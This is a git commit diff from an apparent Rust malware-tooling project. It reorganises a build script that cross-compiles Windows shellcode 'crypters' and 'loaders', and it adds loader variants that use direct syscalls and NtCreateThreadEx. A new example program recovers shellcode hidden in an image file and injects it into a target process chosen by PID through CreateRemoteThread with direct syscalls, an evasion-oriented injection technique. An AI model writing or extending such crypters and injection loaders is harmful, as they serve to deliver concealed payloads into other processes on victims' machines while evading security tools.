a52fe09c09bab15d268e8ebc09ab3bcdfbd81b45
ToBeatElite <amitojsingh8070@gmail.com>
2022-09-02 15:39:34 -0400

    added "frontends" to  new loading methods

--- build.sh
+++ build.sh
@@ -2,16 +2,23 @@
 
 rm -rf bins
 mkdir bins
+mkdir bins/loaders bins/crypters
 
 rustup target add x86_64-pc-windows-gnu
 cargo build --target x86_64-pc-windows-gnu --release
 
-mv target/x86_64-pc-windows-gnu/release/rscrypter.exe bins/rscrypter.exe
-mv target/x86_64-pc-windows-gnu/release/rsloader.exe bins/rsloader.exe
-mv target/x86_64-pc-windows-gnu/release/rsloader_CreateRemoteThread.exe bins/rsloader_CreateRemoteThread.exe
-mv target/x86_64-pc-windows-gnu/release/rsloader_EnumSystemGeoID.exe bins/rsloader_EnumSystemGeoID.exe
+mv target/x86_64-pc-windows-gnu/release/rscrypter.exe bins/crypters/rscrypter.exe
 
-mv target/x86_64-pc-windows-gnu/release/mirincrypter.exe bins/mirincrypter.exe
-mv target/x86_64-pc-windows-gnu/release/mirinloader.exe bins/mirinloader.exe
-mv target/x86_64-pc-windows-gnu/release/mirinloader_CreateRemoteThread.exe bins/mirinloader_CreateRemoteThread.exe
-mv target/x86_64-pc-windows-gnu/release/mirinloader_EnumSystemGeoID.exe bins/mirinloader_EnumSystemGeoID.exe
+mv target/x86_64-pc-windows-gnu/release/rsloader.exe bins/loaders/rsloader.exe
+mv target/x86_64-pc-windows-gnu/release/rsloader_CreateRemoteThread.exe bins/loaders/rsloader_CreateRemoteThread.exe
+mv target/x86_64-pc-windows-gnu/release/rsloader_EnumSystemGeoID.exe bins/loaders/rsloader_EnumSystemGeoID.exe
+mv target/x86_64-pc-windows-gnu/release/rsloader_direct_syscalls.exe bins/loaders/rsloader_direct_syscalls.exe
+mv target/x86_64-pc-windows-gnu/release/rsloader_NtCreateThreadEx.exe bins/loaders/rsloader_NtCreateThreadEx.exe
+
+
+mv target/x86_64-pc-windows-gnu/release/mirincrypter.exe bins/crypters/mirincrypter.exe
+mv target/x86_64-pc-windows-gnu/release/mirinloader.exe bins/loaders/mirinloader.exe
+mv target/x86_64-pc-windows-gnu/release/mirinloader_CreateRemoteThread.exe bins/loaders/mirinloader_CreateRemoteThread.exe
+mv target/x86_64-pc-windows-gnu/release/mirinloader_EnumSystemGeoID.exe bins/loaders/mirinloader_EnumSystemGeoID.exe
+mv target/x86_64-pc-windows-gnu/release/mirinloader_direct_syscalls.exe bins/loaders/mirinloader_direct_syscalls.exe
+mv target/x86_64-pc-windows-gnu/release/mirinloader_NtCreateThreadEx.exe bins/loaders/mirinloader_NtCreateThreadEx.exe
---
+++ src/examples/loaders/mirinloader_NtCreateThreadEx.rs
@@ -0,0 +1,12 @@
+use rsloader::ShellCode;
+
+fn main() {
+    let args: Vec<String> = std::env::args().collect();
+    if args.len() != 3 {
+        println!("[+] usage: rsloader [input_path] [pid]");
+        std::process::exit(0x0100);
+    };
+
+    let recovered_shellcode = ShellCode::from_image(&args[1]);
+    recovered_shellcode.load_CreateRemoteThread_directSyscalls(args[2].parse().unwrap());
+}
